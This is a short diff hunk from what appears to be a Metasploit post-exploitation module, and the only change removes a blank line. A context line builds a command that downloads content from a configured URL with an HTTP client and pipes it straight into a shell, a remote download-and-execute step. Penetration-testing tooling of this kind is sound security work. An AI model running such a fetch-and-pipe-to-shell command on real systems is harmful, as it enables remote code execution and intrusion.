@@ -115,5 +115,4 @@ class MetasploitModule < Msf::Post
       cmd_exec_vprint("#{@http_client} #{@stdout_option} #{datastore['URL']} 2>/dev/null | #{@shell}")
     end
   end
-
 end
